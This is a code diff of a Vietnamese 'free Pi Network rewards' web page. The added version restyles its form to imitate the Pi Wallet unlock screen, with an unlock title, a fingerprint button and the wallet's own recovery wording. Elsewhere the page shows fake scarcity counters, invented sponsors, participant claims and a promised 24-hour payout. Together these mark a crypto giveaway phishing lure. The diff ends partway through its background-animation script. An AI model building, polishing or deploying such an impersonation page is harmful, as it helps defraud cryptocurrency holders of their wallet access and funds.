+        @keyframes pulseGradient {
+            0% { opacity: 0.7; }
+            50% { opacity: 0.9; }
+            100% { opacity: 0.7; }
         }
         
-        .spinner:before,
-        .spinner:after {
-            content: '';
-            display: block;
-            position: absolute;
-            border-radius: 50%;
-            border: 5px solid transparent;
-            border-top-color: var(--pi-purple);
-            border-bottom-color: var(--pi-gold);
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            animation: spinner 1.5s linear infinite;
+        @keyframes waveRotate {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
         }
         
-        .spinner:after {
-            animation-delay: 0.75s;
+        @keyframes coinRotate {
+            0% { transform: rotateY(0deg); }
+            100% { transform: rotateY(360deg); }
         }
-        
-        @keyframes spinner {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        @keyframes staggerAnimation {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
-        
-        /* Holographic effect */
-        .holographic {
-            position: relative;
-            overflow: hidden;
+
+        @keyframes explode {
+            0% {
+                opacity: 1;
+                transform: translate(0, 0) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(var(--tx), var(--ty)) scale(0);
+            }
         }
-        
-        .holographic::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(
-                125deg,
-                transparent 0%,
-                rgba(255, 255, 255, 0.05) 25%,
-                transparent 50%,
-                rgba(255, 255, 255, 0.05) 75%,
-                transparent 100%
-            );
-            z-index: 1;
-            animation: holographic 5s linear infinite;
+
+        @keyframes galaxyEffect {
+            0% {
+                opacity: 0;
+                transform: scale(0);
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+                transform: scale(2);
+            }
         }
-        
-        @keyframes holographic {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 100% 100%; }
+
+        @keyframes lightStreak {
+            0% {
+                opacity: 0;
+                transform: rotate(45deg) translateX(-100px);
+            }
+            10%, 90% {
+                opacity: 0.3;
+            }
+            100% {
+                opacity: 0;
+                transform: rotate(45deg) translateX(calc(100vw + 100px));
+            }
+        }
+
+        @keyframes rotateCircle {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes orbitPlanet {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes floatIcon {
+            0%, 100% { 
+                transform: translateY(0); 
+            }
+            50% { 
+                transform: translateY(-15px); 
+            }
         }
     </style>
 </head>
-<body class="min-h-screen">
-    <!-- Background Elements -->
-    <div class="bg-waves"></div>
-    <div id="starsContainer" class="fixed inset-0 overflow-hidden -z-10"></div>
-    
-    <!-- Loading Spinner -->
-    <div id="loading" class="flex">
-        <div class="spinner"></div>
+<body>
+    <!-- Premium Background Elements -->
+    <div class="premium-bg">
+        <div class="animated-gradient"></div>
+        <div class="wave-container">
+            <div class="wave wave1"></div>
+            <div class="wave wave2"></div>
+            <div class="wave wave3"></div>
+        </div>
+        <div id="starsContainer"></div>
+        <div id="particlesContainer"></div>
+        <div id="coinsContainer"></div>
+        <div id="lightStreaksContainer"></div>
     </div>
     
-    <!-- Header -->
-    <header class="bg-gradient text-white py-5 px-6 shadow-lg header-glow sticky top-0 z-30">
-        <div class="container mx-auto flex justify-between items-center">
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-spinner">
+            <div class="loading-spinner-label">Đang xử lý...</div>
+        </div>
+    </div>
+
+    <!-- Pi Wallet Header -->
+    <header class="pi-header">
+        <div class="pi-header-content">
+            <button class="header-back-btn" id="headerBackBtn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M15 18l-6-6 6-6"></path>
+                </svg>
+            </button>
+            
             <div class="flex items-center">
-                <div class="w-12 h-12 rounded-full bg-white text-purple-700 flex items-center justify-center text-2xl font-bold mr-3 shadow-lg holographic">π</div>
-                <h1 class="text-2xl font-bold">Chương Trình Thưởng Pi Network</h1>
+                <div class="wallet-icon">π</div>
+                <span class="wallet-text">Wallet</span>
+                <div class="pi-coin-icon">π</div>
             </div>
-            <div class="text-white font-bold py-2 px-4 rounded-lg bg-purple-800 bg-opacity-50 shine-effect">MIỄN PHÍ</div>
+            
+            <button class="header-dropdown-btn" id="headerDropdownBtn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M6 9l6 6 6-6"></path>
+                </svg>
+            </button>
         </div>
     </header>
     
     <!-- Main Content -->
-    <main class="container mx-auto px-4 py-8 relative">
-        <!-- Hero Section -->
-        <section class="text-center mb-16 relative">
-            <div class="absolute top-0 left-0 w-full h-full">
-                <div class="absolute top-10 left-10 w-20 h-20 rounded-full bg-purple-500 opacity-10 blur-3xl"></div>
-                <div class="absolute bottom-10 right-10 w-20 h-20 rounded-full bg-purple-700 opacity-10 blur-3xl"></div>
-            </div>
-            
-            <h2 class="text-4xl font-bold mb-4 relative z-10">Nhận Thưởng Pi Network</h2>
-            <p class="text-lg text-center mb-8 max-w-2xl mx-auto opacity-90">Tham gia chương trình khuyến mãi đặc biệt và nhận Pi miễn phí! Ưu đãi có thời hạn dành cho cộng đồng Pi.</p>
-            <button id="openFormBtn" class="btn-primary text-lg pulse font-bold">Nhận Pi Miễn Phí</button>
-            
-            <!-- Features -->
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-12">
-                <div class="card p-5 shine-effect">
-                    <div class="feature-icon">
-                        <i class="fas fa-check-circle"></i>
-                    </div>
-                    <p class="font-medium">Chương Trình Xác Thực</p>
-                </div>
-                <div class="card p-5 shine-effect">
-                    <div class="feature-icon">
-                        <i class="fas fa-clock"></i>
-                    </div>
-                    <p class="font-medium">Nhận Sau 24h</p>
-                </div>
-                <div class="card p-5 shine-effect">
-                    <div class="feature-icon">
-                        <i class="fas fa-shield-alt"></i>
-                    </div>
-                    <p class="font-medium">An Toàn & Bảo Mật</p>
-                </div>
-                <div class="card p-5 shine-effect">
-                    <div class="feature-icon">
-                        <i class="fas fa-users"></i>
-                    </div>
-                    <p class="font-medium">5000+ Người Tham Gia</p>
-                </div>
-            </div>
-        </section>
-        
-        <!-- Rewards Section -->
-        <section class="mb-16 relative">
-            <div class="absolute -top-10 -right-10 w-40 h-40 rounded-full bg-purple-700 opacity-5 blur-3xl"></div>
-            
-            <h3 class="text-3xl font-bold mb-8 text-center">Phần Thưởng Khả Dụng</h3>
-            <div class="grid md:grid-cols-3 gap-8">
-                <div class="card reward-card p-8 holographic">
-                    <div class="float mb-4">
-                        <div class="w-14 h-14 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mx-auto">
-                            <i class="fas fa-gift text-purple-600 dark:text-purple-300 text-2xl"></i>
+    <div class="page-container">
+        <!-- Home Page -->
+        <div id="homePage" class="page page-active">
+            <div class="container mx-auto px-4 py-8">
+                <!-- Hero Section -->
+                <section class="text-center mb-16 relative">
+                    <i class="fas fa-star floating-icon floating-icon-1"></i>
+                    <i class="fas fa-coins floating-icon floating-icon-2"></i>
+                    <i class="fas fa-donate floating-icon floating-icon-3"></i>
+                    <i class="fas fa-gem floating-icon floating-icon-4"></i>
+                    
+                    <h2 class="text-4xl font-bold mb-6 inline-block relative animate-on-scroll">
+                        Nhận Thưởng Pi Network
+                        <span class="absolute -top-3 -right-6 text-xs font-bold bg-gradient-to-r from-yellow-400 to-yellow-600 text-white px-2 py-1 rounded-full transform rotate-12">Mới</span>
+                    </h2>
+                    <p class="text-lg mb-8 max-w-2xl mx-auto animate-on-scroll" data-delay="200">Tham gia chương trình khuyến mãi đặc biệt và nhận Pi miễn phí! Ưu đãi có thời hạn dành cho cộng đồng Pi.</p>
+                    <button id="openFormBtn" class="btn-primary text-lg animate-on-scroll" data-delay="400">Nhận Pi Miễn Phí</button>
+                    
+                    <!-- Features -->
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mt-12">
+                        <div class="card p-5 stagger-item" data-index="0">
+                            <div class="feature-icon">
+                                <i class="fas fa-check-circle"></i>
+                            </div>
+                            <p class="font-medium mt-4">Chương Trình Xác Thực</p>
+                        </div>
+                        <div class="card p-5 stagger-item" data-index="1">
+                            <div class="feature-icon">
+                                <i class="fas fa-clock"></i>
+                            </div>
+                            <p class="font-medium mt-4">Nhận Sau 24h</p>
+                        </div>
+                        <div class="card p-5 stagger-item" data-index="2">
+                            <div class="feature-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <p class="font-medium mt-4">An Toàn & Bảo Mật</p>
+                        </div>
+                        <div class="card p-5 stagger-item" data-index="3">
+                            <div class="feature-icon">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <p class="font-medium mt-4">5000+ Người Tham Gia</p>
                         </div>
                     </div>
-                    <h4 class="text-xl font-bold mb-2 text-center">Thưởng Chào Mừng</h4>
-                    <p class="text-sm text-center text-gray-600 dark:text-gray-300 mb-4">Người dùng mới</p>
-                    <p class="reward-amount mb-4 justify-center">1</p>
-                    <div class="progress-bar mb-2">
-                        <div class="progress-fill" style="width: 84.2%"></div>
-                    </div>
-                    <p class="text-sm text-right">Còn lại: 842/1000</p>
-                </div>
+                </section>
                 
-                <div class="card reward-card p-8 holographic">
-                    <div class="float mb-4">
-                        <div class="w-14 h-14 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mx-auto">
-                            <i class="fas fa-medal text-purple-600 dark:text-purple-300 text-2xl"></i>
+                <!-- Rewards Section -->
+                <section class="mb-16 galaxy-section">
+                    <div class="galaxy-effect" id="galaxyEffect"></div>
+                    <h3 class="text-3xl font-bold mb-8 text-center relative inline-block animate-on-scroll">
+                        Phần Thưởng Khả Dụng
+                        <div class="absolute bottom-0 left-0 w-full h-1 bg-gradient-to-r from-purple-500 to-purple-800"></div>
+                    </h3>
+                    <div class="grid md:grid-cols-3 gap-8">
+                        <div class="card reward-card p-8 tilt-card animate-on-scroll" data-delay="200">
+                            <div class="tilt-card-inner">
+                                <div class="absolute top-3 right-3 text-xs font-bold bg-gradient-to-r from-purple-500 to-purple-800 text-white px-2 py-1 rounded-full">Hot</div>
+                                <h4 class="text-xl font-bold mb-2">Thưởng Chào Mừng</h4>
+                                <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Người dùng mới</p>
+                                <p class="reward-amount mb-4">1</p>
+                                <div class="progress-bar mb-2">
+                                    <div class="progress-fill" style="width: 84.2%"></div>
+                                </div>
+                                <p class="text-sm text-right">Còn lại: 842/1000</p>
+                            </div>
+                        </div>
+                        
+                        <div class="card reward-card p-8 tilt-card animate-on-scroll" data-delay="400">
+                            <div class="tilt-card-inner">
+                                <h4 class="text-xl font-bold mb-2">Phần Thưởng Tiên Phong</h4>
+                                <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Có thời hạn</p>
+                                <p class="reward-amount mb-4">0.5</p>
+                                <div class="progress-bar mb-2">
+                                    <div class="progress-fill" style="width: 82.6%"></div>
+                                </div>
+                                <p class="text-sm text-right">Còn lại: 413/500</p>
+                            </div>
+                        </div>
+                        
+                        <div class="card reward-card p-8 tilt-card animate-on-scroll" data-delay="600">
+                            <div class="tilt-card-inner">
+                                <h4 class="text-xl font-bold mb-2">Thưởng Cộng Đồng</h4>
+                                <p class="text-sm text-gray-500 dark:text-gray-400 mb-3">Thưởng giới thiệu</p>
+                                <p class="reward-amount mb-4">0.2</p>
+                                <div class="progress-bar mb-2">
+                                    <div class="progress-fill" style="width: 64.75%"></div>
+                                </div>
+                                <p class="text-sm text-right">Còn lại: 1295/2000</p>
+                            </div>
                         </div>
                     </div>
-                    <h4 class="text-xl font-bold mb-2 text-center">Phần Thưởng Tiên Phong</h4>
-                    <p class="text-sm text-center text-gray-600 dark:text-gray-300 mb-4">Có thời hạn</p>
-                    <p class="reward-amount mb-4 justify-center">0.5</p>
-                    <div class="progress-bar mb-2">
-                        <div class="progress-fill" style="width: 82.6%"></div>
-                    </div>
-                    <p class="text-sm text-right">Còn lại: 413/500</p>
-                </div>
+                </section>
                 
-                <div class="card reward-card p-8 holographic">
-                    <div class="float mb-4">
-                        <div class="w-14 h-14 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mx-auto">
-                            <i class="fas fa-people-group text-purple-600 dark:text-purple-300 text-2xl"></i>
+                <!-- About Section with Illustration -->
+                <section class="mb-16 animate-on-scroll">
+                    <div class="card p-8 max-w-4xl mx-auto">
+                        <h3 class="text-3xl font-bold mb-8 text-center">Về Chương Trình Này</h3>
+                        
+                        <div class="about-illustration">
+                            <div class="about-circle">
+                                <i class="fas fa-coins about-icon"></i>
+                            </div>
+                            <div class="about-planets about-planet-1"></div>
+                            <div class="about-planets about-planet-2"></div>
+                            <div class="about-planets about-planet-3"></div>
+                        </div>
+                        
+                        <p class="mb-8 text-lg text-center">Chương trình thưởng này là sáng kiến do cộng đồng thực hiện để hỗ trợ những người đam mê Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực.</p>
+                        
+                        <h4 class="text-2xl font-bold mb-6 text-center">Cách Thức Hoạt Động</h4>
+                        <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mb-8">
+                            <div class="text-center animate-scale-in" data-delay="100">
+                                <div class="step-circle">1</div>
+                                <p>Nhấn vào nút "Nhận Pi Miễn Phí" phía trên</p>
+                            </div>
+                            <div class="text-center animate-scale-in" data-delay="200">
+                                <div class="step-circle">2</div>
+                                <p>Nhập địa chỉ ví Pi của bạn (không phải cụm mật khẩu)</p>
+                            </div>
+                            <div class="text-center animate-scale-in" data-delay="300">
+                                <div class="step-circle">3</div>
+                                <p>Gửi yêu cầu của bạn để xác minh</p>
+                            </div>
+                            <div class="text-center animate-scale-in" data-delay="400">
+                                <div class="step-circle">4</div>
+                                <p>Nhận phần thưởng Pi trong vòng 24 giờ</p>
+                            </div>
+                        </div>
+                        
+                        <div class="certificate">
+                            <div class="certificate-icon">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <p class="certificate-title">Bảo Mật & Minh Bạch</p>
+                            <p class="certificate-text">Đây là chiến dịch khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức. Chúng tôi sẽ không bao giờ yêu cầu mật khẩu, cụm khôi phục, hoặc khóa riêng của bạn.</p>
                         </div>
                     </div>
-                    <h4 class="text-xl font-bold mb-2 text-center">Thưởng Cộng Đồng</h4>
-                    <p class="text-sm text-center text-gray-600 dark:text-gray-300 mb-4">Thưởng giới thiệu</p>
-                    <p class="reward-amount mb-4 justify-center">0.2</p>
-                    <div class="progress-bar mb-2">
-                        <div class="progress-fill" style="width: 64.75%"></div>
-                    </div>
-                    <p class="text-sm text-right">Còn lại: 1295/2000</p>
-                </div>
-            </div>
-        </section>
-        
-        <!-- About Section -->
-        <section class="card p-8 mb-16 max-w-4xl mx-auto relative">
-            <div class="absolute -bottom-10 -left-10 w-40 h-40 rounded-full bg-purple-500 opacity-5 blur-3xl"></div>
-            
-            <h3 class="text-3xl font-bold mb-8 text-center">Về Chương Trình Này</h3>
-            <p class="mb-8 text-lg">Chương trình thưởng này là sáng kiến do cộng đồng thực hiện để hỗ trợ những người đam mê Pi Network. Là chương trình khuyến mãi độc lập, chúng tôi phân phối một lượng giới hạn Pi coins cho các thành viên cộng đồng tích cực.</p>
-            
-            <h4 class="text-2xl font-bold mb-4">Cách Thức Hoạt Động</h4>
-            <div class="grid md:grid-cols-4 gap-6 mb-8">
-                <div class="text-center">
-                    <div class="w-16 h-16 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mx-auto mb-4 text-2xl font-bold text-purple-600 dark:text-purple-300">1</div>
-                    <p>Nhấn vào nút "Nhận Pi Miễn Phí" phía trên</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mx-auto mb-4 text-2xl font-bold text-purple-600 dark:text-purple-300">2</div>
-                    <p>Nhập địa chỉ ví Pi của bạn (không phải cụm mật khẩu)</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mx-auto mb-4 text-2xl font-bold text-purple-600 dark:text-purple-300">3</div>
-                    <p>Gửi yêu cầu của bạn để xác minh</p>
-                </div>
-                <div class="text-center">
-                    <div class="w-16 h-16 rounded-full bg-purple-100 dark:bg-purple-900 flex items-center justify-center mx-auto mb-4 text-2xl font-bold text-purple-600 dark:text-purple-300">4</div>
-                    <p>Nhận phần thưởng Pi trong vòng 24 giờ</p>
-                </div>
-            </div>
-            
-            <div class="legal-notice mb-8">
-                <p class="font-bold mb-2 text-lg">Lưu ý quan trọng:</p>
-                <p>Đây là chiến dịch khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức. Chúng tôi sẽ không bao giờ yêu cầu mật khẩu, cụm khôi phục, hoặc khóa riêng của bạn.</p>
-            </div>
-            
-            <h4 class="text-2xl font-bold mb-4">Được Hỗ Trợ Bởi</h4>
-            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
-                <div class="p-4 bg-gray-100 dark:bg-gray-800 rounded-lg font-medium">TechFi</div>
-                <div class="p-4 bg-gray-100 dark:bg-gray-800 rounded-lg font-medium">BlockHub</div>
-                <div class="p-4 bg-gray-100 dark:bg-gray-800 rounded-lg font-medium">CryptoPlus</div>
-                <div class="p-4 bg-gray-100 dark:bg-gray-800 rounded-lg font-medium">PiCommunity</div>
-            </div>
-        </section>
-        
-        <!-- Wallet Form (Hidden initially) -->
-        <section id="walletForm" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
-            <div class="card max-w-md w-full mx-4 p-8 relative modal-enter">
-                <button id="closeFormBtn" class="absolute top-4 right-4 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200 text-xl">
-                    <i class="fas fa-times"></i>
-                </button>
+                </section>
                 
-                <h3 class="text-2xl font-bold mb-6 text-center">Gửi Địa Chỉ Ví Pi</h3>
-                
-                <form id="piWalletForm" class="space-y-4">
-                    <div>
-                        <label for="walletAddress" class="block mb-2 font-medium">Địa Chỉ Ví Pi</label>
-                        <input type="text" id="walletAddress" name="walletAddress" placeholder="Nhập địa chỉ ví Pi của bạn..." required
-                            class="w-full px-4 py-3 border border-gray-300 dark:border-gray-700 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent dark:bg-gray-800 text-base">
+                <!-- Sponsors Section Enhanced -->
+                <section class="mb-16">
+                    <h4 class="text-2xl font-bold mb-8 text-center animate-on-scroll">Được Hỗ Trợ Bởi</h4>
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
+                        <div class="sponsor-card animate-slide-right" data-delay="100">
+                            <div class="sponsor-logo">
+                                <i class="fas fa-chart-line"></i>
+                            </div>
+                            <div class="sponsor-name">TechFi</div>
+                            <div class="sponsor-role">Hỗ trợ kỹ thuật</div>
+                        </div>
+                        <div class="sponsor-card animate-slide-right" data-delay="200">
+                            <div class="sponsor-logo">
+                                <i class="fas fa-cubes"></i>
+                            </div>
+                            <div class="sponsor-name">BlockHub</div>
+                            <div class="sponsor-role">Đối tác blockchain</div>
+                        </div>
+                        <div class="sponsor-card animate-slide-left" data-delay="300">
+                            <div class="sponsor-logo">
+                                <i class="fas fa-credit-card"></i>
+                            </div>
+                            <div class="sponsor-name">CryptoPlus</div>
+                            <div class="sponsor-role">Cổng thanh toán</div>
+                        </div>
+                        <div class="sponsor-card animate-slide-left" data-delay="400">
+                            <div class="sponsor-logo">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <div class="sponsor-name">PiCommunity</div>
+                            <div class="sponsor-role">Hỗ trợ cộng đồng</div>
+                        </div>
+                    </div>
+                </section>
+            </div>
+            
+            <!-- Footer -->
+            <footer class="py-10 px-4 relative">
+                <div class="absolute inset-0 opacity-10 bg-purple-900"></div>
+                <div class="relative z-10 container mx-auto text-center">
+                    <div class="mb-6">
+                        <div class="w-16 h-16 mx-auto bg-gradient-to-r from-purple-600 to-purple-800 rounded-full flex items-center justify-center text-white text-2xl font-bold shadow-lg">π</div>
+                    </div>
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-8">
+                        <div>
+                            <h5 class="font-bold mb-3">Liên Hệ</h5>
+                            <p class="flex items-center justify-center mb-2">
+                                <i class="fas fa-envelope mr-2 text-purple-400"></i>
+                                support@pirewards.com
+                            </p>
+                            <p class="flex items-center justify-center">
+                                <i class="fas fa-globe mr-2 text-purple-400"></i>
+                                www.pirewards.com
+                            </p>
+                        </div>
+                        <div>
+                            <h5 class="font-bold mb-3">Chính Sách</h5>
+                            <p class="mb-2">Bảo mật dữ liệu</p>
+                            <p>Điều khoản sử dụng</p>
+                        </div>
+                        <div>
+                            <h5 class="font-bold mb-3">Theo Dõi</h5>
+                            <div class="flex justify-center space-x-4">
+                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
+                                    <i class="fab fa-telegram text-purple-400"></i>
+                                </span>
+                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
+                                    <i class="fab fa-twitter text-purple-400"></i>
+                                </span>
+                                <span class="w-10 h-10 bg-purple-800 bg-opacity-30 rounded-full flex items-center justify-center">
+                                    <i class="fab fa-discord text-purple-400"></i>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                    <p class="mb-4 max-w-2xl mx-auto">Đây là chương trình khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức.</p>
+                    <p class="text-sm text-gray-500 dark:text-gray-400">© 2023 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền.</p>
+                </div>
+            </footer>
+        </div>
+        
+        <!-- Pi Wallet Form Page -->
+        <div id="formPage" class="page page-inactive-right">
+            <div class="container mx-auto px-4 py-8">
+                <div class="pi-wallet-style surprise-container">
+                    <div class="pi-title animate-on-scroll">Mở khóa ví Pi</div>
+                    
+                    <div class="animate-on-scroll" data-delay="200">
+                        <div class="pi-input-container">
+                            <input type="text" id="walletAddress" class="pi-input" placeholder="Nhập địa chỉ ví Pi của bạn tại đây">
+                        </div>
                     </div>
                     
-                    <div class="text-sm text-gray-600 dark:text-gray-400">
-                        <p class="mb-2">Là một ví không giám sát, địa chỉ ví của bạn sẽ được công khai.</p>
-                        <p>Bạn bị quên địa chỉ ví? <a href="#" class="text-purple-600 dark:text-purple-400">Bạn có thể tìm trong ví</a>, bạn sẽ có thể thể truy cập.</p>
-                    </div>
-                    
-                    <div class="legal-notice my-4">
-                        <p><strong>CHÚ Ý:</strong> Đây là một ứng dụng thưởng Pi hợp pháp. Bạn chỉ cần cung cấp địa chỉ ví Pi (KHÔNG PHẢI cụm mật khẩu) để nhận phần thưởng.</p>
-                    </div>
-                    
-                    <!-- Lock Mechanism -->
-                    <div class="flex items-center justify-center mt-4 mb-2">
-                        <button type="button" id="unlockBtn" class="flex items-center py-3 px-6 rounded-lg bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors">
-                            <i class="fas fa-lock mr-2"></i> <span>Mở khóa gửi</span>
+                    <div class="animate-on-scroll" data-delay="400">
+                        <button id="unlockSubmitBtn" class="pi-button pi-button-primary surprise-trigger">
+                            MỞ KHÓA VỚI ĐỊA CHỈ VÍ
+                        </button>
+                        
+                        <button class="pi-button pi-button-secondary">
+                            MỞ KHÓA BẰNG VÂN TAY
                         </button>
                     </div>
                     
-                    <button type="submit" id="submitBtn" class="w-full btn-primary py-3 rounded-lg opacity-50 cursor-not-allowed" disabled>
-                        GỬI ĐỊA CHỈ VÍ
+                    <div class="pi-info-text animate-on-scroll" data-delay="600">
+                        <p>Là một ví không giám sát, địa chỉ ví của bạn sẽ được công khai.</p>
+                        <p class="mt-2">Bạn quên địa chỉ ví? <a href="#" class="pi-link">Bạn có thể tạo một ví mới</a>, nhưng tất cả số π trong ví trước đó của bạn sẽ không thể truy cập.</p>
+                    </div>
+                    
+                    <!-- Hidden explosion particles for surprise effect -->
+                    <div id="explosionContainer"></div>
+                </div>
+                
+                <div class="mt-8 text-center">
+                    <button id="backToHomeBtn" class="btn-secondary">
+                        <i class="fas fa-arrow-left mr-2"></i> Quay Lại Trang Chủ
                     </button>
-                </form>
-            </div>
-        </section>
-        
-        <!-- Success Modal (Hidden initially) -->
-        <section id="successModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50">
-            <div class="card max-w-md w-full mx-4 p-8 modal-enter">
-                <div class="text-center mb-8">
-                    <div class="w-24 h-24 bg-green-100 dark:bg-green-900 rounded-full flex items-center justify-center mx-auto mb-6">
-                        <i class="fas fa-check text-green-600 dark:text-green-400 text-4xl"></i>
-                    </div>
-                    <h3 class="text-2xl font-bold">Yêu Cầu Gửi Thành Công!</h3>
-                    <p class="text-gray-600 dark:text-gray-400 mt-3">Phần thưởng Pi của bạn đã được xếp hàng để xử lý. Nó sẽ được gửi đến ví của bạn trong vòng 24 giờ.</p>
                 </div>
-                
-                <div class="space-y-4 mb-8">
-                    <div class="flex justify-between py-3 border-b border-gray-200 dark:border-gray-700">
-                        <span class="font-medium">Địa Chỉ Ví:</span>
-                        <span id="successWalletAddress" class="truncate max-w-[200px]">...</span>
-                    </div>
-                    <div class="flex justify-between py-3 border-b border-gray-200 dark:border-gray-700">
-                        <span class="font-medium">Số Lượng Thưởng:</span>
-                        <span class="text-purple-600 dark:text-purple-400 font-bold">1 π</span>
-                    </div>
-                    <div class="flex justify-between py-3 border-b border-gray-200 dark:border-gray-700">
-                        <span class="font-medium">Thời Gian Dự Kiến:</span>
-                        <span>Trong vòng 24 giờ</span>
-                    </div>
-                </div>
-                
-                <button id="backToHomeBtn" class="w-full btn-primary py-3 rounded-lg">
-                    Quay Lại Trang Chủ
-                </button>
             </div>
-        </section>
-    </main>
-    
-    <!-- Footer -->
-    <footer class="bg-gray-100 dark:bg-gray-800 py-8 px-4 relative">
-        <div class="container mx-auto text-center">
-            <div class="mb-6">
-                <div class="w-16 h-16 rounded-full bg-purple-600 flex items-center justify-center text-white text-3xl font-bold mx-auto">π</div>
-            </div>
-            <p class="mb-4 text-sm max-w-2xl mx-auto">Đây là chương trình khuyến mãi độc lập và không liên kết hay được xác nhận bởi Pi Network chính thức.</p>
-            <p class="text-sm text-gray-600 dark:text-gray-400">© 2023 Chương Trình Thưởng Pi Network. Bảo lưu mọi quyền.</p>
         </div>
-    </footer>
+    </div>
+
+    <!-- Success Modal (initially hidden) -->
+    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+        <div class="card max-w-md w-full mx-4 p-8 modal-enter">
+            <div class="text-center mb-8">
+                <div class="success-icon">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h3 class="text-3xl font-bold mb-3">Yêu Cầu Gửi Thành Công!</h3>
+                <p class="text-gray-500 dark:text-gray-400">Phần thưởng Pi của bạn đã được xếp hàng để xử lý. Nó sẽ được gửi đến ví của bạn trong vòng 24 giờ.</p>
+            </div>
+            
+            <div class="space-y-6 mb-8">
+                <div class="success-detail">
+                    <span class="success-detail-label">Địa Chỉ Ví:</span>
+                    <span id="successWalletAddress" class="success-detail-value truncate max-w-[200px]">...</span>
+                </div>
+                <div class="success-detail">
+                    <span class="success-detail-label">Số Lượng Thưởng:</span>
+                    <span class="success-detail-value highlight">1</span>
+                </div>
+                <div class="success-detail">
+                    <span class="success-detail-label">Thời Gian Dự Kiến:</span>
+                    <span class="success-detail-value">Trong vòng 24 giờ</span>
+                </div>
+            </div>
+            
+            <button id="closeSuccessBtn" class="w-full btn-primary py-4">
+                Quay Lại Trang Chủ
+            </button>
+        </div>
+    </div>
 
     <script>
-        // Create stars and Pi coins in the background
-        function createStarsAndCoins() {
-            const starsContainer = document.getElementById('starsContainer');
-            const numStars = 150;
-            const numCoins = 12;
-            
+        // Create premium background effects
+        function createPremiumBackground() {
             // Create stars
+            const starsContainer = document.getElementById('starsContainer');
+            const numStars = 200;
+            
             for (let i = 0; i < numStars; i++) {
                 const star = document.createElement('div');
                 star.className = 'star';
@@ -725,83 +1579,322 @@
                 starsContainer.appendChild(star);
             }
             
-            // Create floating Pi coins
+            // Create particles
+            const particlesContainer = document.getElementById('particlesContainer');
+            const numParticles = 30;
+            
+            for (let i = 0; i < numParticles; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.width = `${Math.random() * 6 + 2}px`;
+                particle.style.height = particle.style.width;
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                particle.style.animationDelay = `${Math.random() * 10}s`;
+                particle.style.animationDuration = `${15 + Math.random() * 10}s`;
+                particlesContainer.appendChild(particle);
+            }
+            
+            // Create premium Pi coins
+            const coinsContainer = document.getElementById('coinsContainer');
+            const numCoins = 12;
+            
             for (let i = 0; i < numCoins; i++) {
                 const coin = document.createElement('div');
-                coin.className = 'pi-coin';
+                coin.className = 'premium-coin';
+                
+                const coinInner = document.createElement('div');
+                coinInner.className = 'coin-inner';
+                
+                const coinFront = document.createElement('div');
+                coinFront.className = 'coin-front';
+                coinFront.textContent = 'π';
+                
+                const coinBack = document.createElement('div');
